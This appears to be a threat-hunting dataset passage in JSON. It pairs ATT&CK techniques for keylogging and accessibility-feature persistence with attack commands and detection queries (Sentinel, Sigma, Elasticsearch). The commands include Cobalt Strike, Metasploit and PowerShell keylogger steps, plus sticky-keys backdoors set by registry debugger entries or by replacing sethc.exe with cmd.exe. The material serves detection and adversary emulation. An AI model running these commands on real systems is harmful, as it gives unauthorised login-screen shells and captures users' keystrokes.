"name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/linux/xkeylogger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/linux/xkeylogger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/keylogger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/keylogger", "name": "Empire Module Command"}], "command_list": ["starting the keylogger:\nkeylogger {x86|x64} {pid}\nwhen you're ready to view logs:\nview -> keylog\nwhen you're done keylogging:\njobs\njobkill {job id number}", "starting the keylogger:\nkeyscan_start\nwhen you're ready to get the logs:\nkeyscan_dump\nwhen you're done keylogging:\nkeyscan_stop", "Set-Location $PathToAtomicsFolder\n.\\T1056\\src\\Get-Keystrokes.ps1 -LogPath $env:TEMP\\key.log\n", "powershell.exe Get-Keystrokes -LogPath C:\\key.log", "powershell/collection/USBKeylogger", "powershell/collection/USBKeylogger", "powershell/collection/keylogger", "powershell/collection/keylogger", "python/collection/linux/keylogger", "python/collection/linux/keylogger", "python/collection/linux/xkeylogger", "python/collection/linux/xkeylogger", "python/collection/osx/keylogger", "python/collection/osx/keylogger"], "technique_id": "T1056", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1056", "Built-in Windows Command": "", "Cobalt Strike": "starting the keylogger:\nkeylogger {x86|x64} {pid}\nwhen you're ready to view logs:\nview -> keylog\nwhen you're done keylogging:\njobs\njobkill {job id number}", "Description": "Keylogging is extremely useful to get credentials and other information from the victim, but make sure that you are keylogging in a process belonging to the user you want to spy on. Keylogging within a SYSTEM process will not get you the keystrokes of other users on the system. For Cobalt Strike, make sure you specifiy the correct architecture and PID for a process running as the target victim. For Metasploit, make sure you've migrated to a process that is running as the target victim (explore.exe is always good).", "Metasploit": "starting the keylogger:\nkeyscan_start\nwhen you're ready to get the logs:\nkeyscan_dump\nwhen you're done keylogging:\nkeyscan_stop"}}, {"Atomic Red Team Test - Input Capture": {"display_name": "Input Capture", "atomic_tests": [{"description": "Utilize PowerShell and external resource to capture keystrokes\n[Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056/src/Get-Keystrokes.ps1)\nProvided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)\n", "supported_platforms": ["windows"], "name": "Input Capture", "input_arguments": {"filepath": {"default": "$env:TEMP\\key.log", "type": "Path", "description": "Name of the local file, include path."}}, "executor": {"elevation_required": true, "command": "Set-Location $PathToAtomicsFolder\n.\\T1056\\src\\Get-Keystrokes.ps1 -LogPath #{filepath}\n", "name": "powershell", "cleanup_command": "Remove-Item $env:TEMP\\key.log -ErrorAction Ignore\n"}}], "attack_technique": "T1056"}}, {"Threat Hunting Tables": {"mitre_attack": "T1056", "file_value": "", "file_path": "", "parent_process": "powershell.exe", "itw_sample": "", "chain_id": "100132", "registry_value": "", "mitre_caption": "input_capture", "registry_path": "", "frequency": "rare", "commandline_string": "Get-Keystrokes -LogPath C:\\key.log", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1056", "Empire Module": "powershell/collection/USBKeylogger", "Technique": "Input Capture", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/collection/USBKeylogger\":  [\"T1056\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1056", "Empire Module": "powershell/collection/keylogger", "Technique": "Input Capture", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/collection/keylogger\":  [\"T1056\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1056", "Empire Module": "python/collection/linux/keylogger", "Technique": "Input Capture", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/collection/linux/keylogger\":  [\"T1056\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1056", "Empire Module": "python/collection/linux/xkeylogger", "Technique": "Input Capture", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/collection/linux/xkeylogger\":  [\"T1056\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1056", "Empire Module": "python/collection/osx/keylogger", "Technique": "Input Capture", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/collection/osx/keylogger\":  [\"T1056\"],"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "Persistence:", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "Persistence:", "Built-in Windows Command": "", "Cobalt Strike": "", "Description": "", "Metasploit": ""}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Sticky Keys Persistence via Registry Manipulations:\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Sticky Keys Persistence via Registry Manipulations:\nshell REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "post/windows/manage/sticky_keys", "name": "Metasploit"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Sticky Keys Persistence via binary swapping:\ntakeown.exe C:\\Windows\\system32\\sethc.exe\ndel C:\\Windows\\system32\\sethc.exe\ncopy C:\\Windows\\system32\\cmd.exe C:\\Windows\\system32\\sethc.exe", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Sticky Keys Persistence via binary swapping:\nshell takeown.exe C:\\Windows\\system32\\sethc.exe\nshell del C:\\Windows\\system32\\sethc.exe\nshell copy C:\\Windows\\system32\\cmd.exe C:\\Windows\\system32\\sethc.exe", "name": "Cobalt Strike"}, {"source": "atomics/T1015/T1015.yaml", "command": "$input_table = \"osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\".split(\",\")\n$Name = \"Debugger\"\n$Value = \"#{attached_process}\"\nForeach ($item in $input_table){   \n  $item = $item.trim()\n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\"\n  IF(!(Test-Path $registryPath))\n  {\n    New-Item -Path $registryPath -Force\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n  }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value\n  }\n}\n", "name": null}, {"source": "atomics/T1015/T1015.yaml", "command": "$input_table = \"osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\".split(\",\")\n$Name = \"Debugger\"\n$Value = \"C:\\windows\\system32\\cmd.exe\"\nForeach ($item in $input_table){   \n  $item = $item.trim()\n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\"\n  IF(!(Test-Path $registryPath))\n  {\n    New-Item -Path $registryPath -Force\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n  }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value\n  }\n}\n", "name": null}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg add", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe /v \"Debugger\" /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg add", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg add", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg add", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg add", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\narrator.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg add", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DisplaySwitch.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "cmd.exe reg add", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\AtBroker.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "name": "registry_path"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_wmi_debugger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_wmi_debugger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/debugger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/debugger", "name": "Empire Module Command"}], "command_list": ["Sticky Keys Persistence via Registry Manipulations:\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f", "Sticky Keys Persistence via Registry Manipulations:\nshell REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f", "post/windows/manage/sticky_keys", "Sticky Keys Persistence via binary swapping:\ntakeown.exe C:\\Windows\\system32\\sethc.exe\ndel C:\\Windows\\system32\\sethc.exe\ncopy C:\\Windows\\system32\\cmd.exe C:\\Windows\\system32\\sethc.exe", "Sticky Keys Persistence via binary swapping:\nshell takeown.exe C:\\Windows\\system32\\sethc.exe\nshell del C:\\Windows\\system32\\sethc.exe\nshell copy C:\\Windows\\system32\\cmd.exe C:\\Windows\\system32\\sethc.exe", "$input_table = \"osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\".split(\",\")\n$Name = \"Debugger\"\n$Value = \"#{attached_process}\"\nForeach ($item in $input_table){   \n  $item = $item.trim()\n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\"\n  IF(!(Test-Path $registryPath))\n  {\n    New-Item -Path $registryPath -Force\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n  }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value\n  }\n}\n", "$input_table = \"osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\".split(\",\")\n$Name = \"Debugger\"\n$Value = \"C:\\windows\\system32\\cmd.exe\"\nForeach ($item in $input_table){   \n  $item = $item.trim()\n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\"\n  IF(!(Test-Path $registryPath))\n  {\n    New-Item -Path $registryPath -Force\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n  }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value\n  }\n}\n", "cmd.exe reg add", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe /v \"Debugger\" /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f", "cmd.exe reg add", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "cmd.exe reg add", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "cmd.exe reg add", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "cmd.exe reg add", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\narrator.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "cmd.exe reg add", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DisplaySwitch.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "cmd.exe reg add", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\AtBroker.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "powershell/lateral_movement/invoke_wmi_debugger", "powershell/lateral_movement/invoke_wmi_debugger", "powershell/persistence/misc/debugger", "powershell/persistence/misc/debugger"], "technique_id": "T1015", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1015", "Built-in Windows Command": "Sticky Keys Persistence via Registry Manipulations:\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f", "Cobalt Strike": "Sticky Keys Persistence via Registry Manipulations:\nshell REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f", "Description": "Modify the registry to point the sethc.exe file to point to cmd.exe", "Metasploit": "post/windows/manage/sticky_keys"}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1015", "Built-in Windows Command": "Sticky Keys Persistence via binary swapping:\ntakeown.exe C:\\Windows\\system32\\sethc.exe\ndel C:\\Windows\\system32\\sethc.exe\ncopy C:\\Windows\\system32\\cmd.exe C:\\Windows\\system32\\sethc.exe", "Cobalt Strike": "Sticky Keys Persistence via binary swapping:\nshell takeown.exe C:\\Windows\\system32\\sethc.exe\nshell del C:\\Windows\\system32\\sethc.exe\nshell copy C:\\Windows\\system32\\cmd.exe C:\\Windows\\system32\\sethc.exe", "Description": "Remove the real sethc.exe and replace it with a copy of cmd.exe. You can also just move the original sethc.exe to a different file if you don't want to delete it", "Metasploit": ""}}, {"Atomic Red Team Test - Accessibility Features": {"display_name": "Accessibility Features", "atomic_tests": [{"description": "Attaches cmd.exe to a list of processes. Configure your own Input arguments to a different executable or list of executables.\n", "supported_platforms": ["windows"], "name": "Attaches Command Prompt as a Debugger to a List of Target Processes", "input_arguments": {"parent_list": {"default": "osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe", "type": "String", "description": "Comma separated list of system binaries to which you want to attach each #{attached_process}. Default: \"osk.exe\"\n"}, "attached_process": {"default": "C:\\windows\\system32\\cmd.exe", "type": "Path", "description": "Full path to process to attach to target in #{parent_list}. Default: cmd.exe\n"}}, "executor": {"elevation_required": true, "command": "$input_table = \"#{parent_list}\".split(\",\")\n$Name = \"Debugger\"\n$Value = \"#{attached_process}\"\nForeach ($item in $input_table){   \n  $item = $item.trim()\n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\"\n  IF(!(Test-Path $registryPath))\n  {\n    New-Item -Path $registryPath -Force\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n  }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value\n  }\n}\n", "name": "powershell", "cleanup_command": "$input_table = \"#{parent_list}\".split(\",\")\nForeach ($item in $input_table)\n{\n  $item = $item.trim()\n  reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\" /v Debugger /f\n}"}}], "attack_technique": "T1015"}}, {"Threat Hunting Tables": {"mitre_attack": "T1015", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100175", "registry_value": "", "mitre_caption": "accessibity_features", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe /v \"Debugger\" /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f", "frequency": "rare", "commandline_string": "reg add", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1015", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100176", "registry_value": "", "mitre_caption": "accessibity_features", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "frequency": "rare", "commandline_string": "reg add", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1015", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100177", "registry_value": "", "mitre_caption": "accessibity_features", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "frequency": "rare", "commandline_string": "reg add", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1015", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100178", "registry_value": "", "mitre_caption": "accessibity_features", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "frequency": "rare", "commandline_string": "reg add", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1015", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100179", "registry_value": "", "mitre_caption": "accessibity_features", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\narrator.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "frequency": "rare", "commandline_string": "reg add", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1015", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100180", "registry_value": "", "mitre_caption": "accessibity_features", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DisplaySwitch.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "frequency": "rare", "commandline_string": "reg add", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1015", "file_value": "", "file_path": "", "parent_process": "cmd.exe", "itw_sample": "", "chain_id": "100181", "registry_value": "", "mitre_caption": "accessibity_features", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\AtBroker.exe /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f", "frequency": "rare", "commandline_string": "reg add", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1015", "Empire Module": "powershell/lateral_movement/invoke_wmi_debugger", "Technique": "Accessibility Features", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/lateral_movement/invoke_wmi_debugger\":  [\"T1015\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1015", "Empire Module": "powershell/persistence/misc/debugger", "Technique": "Accessibility Features", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/persistence/misc/debugger\":  [\"T1015\"],"}}], "queries": [{"query": "Sysmon| where EventID == 1 and process_parent_path contains\"winlogon.exe\"and (process_path contains \"sethc.exe\"or process_path contains \"utilman.exe\"or process_path contains \"osk.exe\"or process_path contains \"magnify.exe\"or process_path contains \"displayswitch.exe\"or process_path contains \"narrator.exe\"or process_path contains \"atbroker.exe\")", "product": "Azure Sentinel", "name": "Accessibility Features"}, {"query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14) and registry_key_path contains \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\*\"", "product": "Azure Sentinel", "name": "Accessibility Features Registry"}, {"query": "action: global\ntitle: Sticky Key Like Backdoor Usage\nid: baca5663-583c-45f9-b5dc-ea96a22ce542\ndescription: Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login\n    screen\nreferences:\n    - https://blogs.technet.microsoft.com/jonathantrull/2016/10/03/detecting-sticky-key-backdoors/\ntags:\n    - attack.privilege_escalation\n    - attack.persistence\n    - attack.t1015\n    - car.2014-11-003\n    - car.2014-11-008\nauthor: Florian Roth, @twjackomo\ndate: 2018/03/15\ndetection:\n    condition: 1 of them\nfalsepositives:\n    - Unlikely\nlevel: critical\n", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "action: global\ntitle: Sticky Key Like Backdoor Usage\nid: baca5663-583c-45f9-b5dc-ea96a22ce542\ndescription: Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login\n    screen\nreferences:\n    - https://blogs.technet.microsoft.com/jonathantrull/2016/10/03/detecting-sticky-key-backdoors/\ntags:\n    - attack.privilege_escalation\n    - attack.persistence\n    - attack.t1015\n    - car.2014-11-003\n    - car.2014-11-008\nauthor: Florian Roth, @twjackomo\ndate: 2018/03/15\ndetection:\n    condition: 1 of them\nfalsepositives:\n    - Unlikely\nlevel: critical\n", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:(*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\ NT\\\\\\\\CurrentVersion\\\\\\\\Image\\\\ File\\\\ Execution\\\\ Options\\\\\\\\sethc.exe\\\\\\\\Debugger OR *\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\ NT\\\\\\\\CurrentVersion\\\\\\\\Image\\\\ File\\\\ Execution\\\\ Options\\\\\\\\utilman.exe\\\\\\\\Debugger OR *\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\ NT\\\\\\\\CurrentVersion\\\\\\\\Image\\\\ File\\\\ Execution\\\\ Options\\\\\\\\osk.exe\\\\\\\\Debugger OR *\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\ NT\\\\\\\\CurrentVersion\\\\\\\\Image\\\\ File\\\\ Execution\\\\ Options\\\\\\\\Magnify.exe\\\\\\\\Debugger OR *\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\ NT\\\\\\\\CurrentVersion\\\\\\\\Image\\\\ File\\\\ Execution\\\\ Options\\\\\\\\Narrator.exe\\\\\\\\Debugger OR *\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\ NT\\\\\\\\CurrentVersion\\\\\\\\Image\\\\ File\\\\ Execution\\\\ Options\\\\\\\\DisplaySwitch.exe\\\\\\\\Debugger) AND EventType:\"SetValue\")\\n(ParentImage.keyword:(*\\\\\\\\winlogon.exe) AND CommandLine.keyword:(*cmd.exe\\\\ sethc.exe\\\\ * OR *cmd.exe\\\\ utilman.exe\\\\ * OR *cmd.exe\\\\ osk.exe\\\\ * OR *cmd.exe\\\\ Magnify.exe\\\\ * OR *cmd.exe\\\\ Narrator.exe\\\\ * OR *cmd.exe\\\\ DisplaySwitch.exe\\\\ *))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Sticky-Key-Like-Backdoor-Usage <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Sticky Key Like Backdoor Usage\",\\n    \"description\": \"Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen\",\\n    \"tags\": [\\n      \"attack.privilege_escalation\",\\n      \"attack.persistence\",\\n      \"attack.t1015\",\\n      \"car.2014-11-003\",\\n      \"car.2014-11-008\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:(*\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\sethc.exe\\\\\\\\\\\\\\\\Debugger OR *\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\utilman.exe\\\\\\\\\\\\\\\\Debugger OR *\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\osk.exe\\\\\\\\\\\\\\\\Debugger OR *\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\Magnify.exe\\\\\\\\\\\\\\\\Debugger OR *\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\Narrator.exe\\\\\\\\\\\\\\\\Debugger OR *\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\DisplaySwitch.exe\\\\\\\\\\\\\\\\Debugger) AND EventType:\\\\\"SetValue\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:(*\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ 